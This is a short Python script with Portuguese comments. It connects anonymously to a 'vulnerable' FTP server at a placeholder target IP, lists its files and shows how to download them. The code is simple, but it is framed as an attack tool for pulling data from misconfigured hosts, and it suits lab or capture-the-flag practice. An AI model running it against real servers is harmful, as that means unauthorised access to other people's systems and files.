import ftplib

def connect_ftp(ip):
    try:
        # cria instancia FTP
        ftp = ftplib.FTP(ip)
        # tentar fazer login anonimamente
        ftp.login()  
        print(f"[SUCCESS] Conectado ao {ip}")
        return ftp
    except ftplib.all_errors as e:
        print(f"[FAIL] Não foi possível conectar ao {ip}: {e}")
        return None

# listar arquivos no diretório atual
def list_files(ftp):
    try:
        # pega a  lista de arquivos no diretório atual
        files = ftp.nlst()
        print("[ARQUIVOS]")
        for file in files:
            print(f" - {file}")
    except ftplib.error_perm as e:
        print(f"Não foi possível listar os arquivos: {e}")

# funçao pra mudar de diretorio
def change_directory(ftp, path):
    try:
        # muda ppro diretório especificado
        ftp.cwd(path)
        print(f"Mudou para o diretório: {path}")
    except ftplib.error_perm as e:
        print(f"Não foi possível mudar de diretório: {e}")

# funçao pra baixar um arquivo
def download_file(ftp, filename):
    try:
        # abre um arquivo local pra escrita em modo binario
        with open(filename, 'wb') as f:
            # baixa o arquivo do sv FTP
            ftp.retrbinary(f"RETR {filename}", f.write)
        print(f"Baixou: {filename}")
    except ftplib.error_perm as e:
        print(f"Não foi possível baixar o arquivo: {e}")

def main():
    ip = 'IP_DO_ALVO'  # Substitua pelo IP do alvo

    # conecta no servidor FTP >>VULNERAVEL<<
    ftp = connect_ftp(ip)
    if ftp:
        # lista os arquivos do dir
        list_files(ftp)

        # exemplo de mudança caso voce queira mudar o diretorio
        # change_directory(ftp, 'caminho/para/diretorio')

        # ex baixando arquivo
        # download_file(ftp, 'nome_do_arquivo.ext')

        # encerra a conexão FTP
        ftp.quit()

if __name__ == "__main__":
    main()
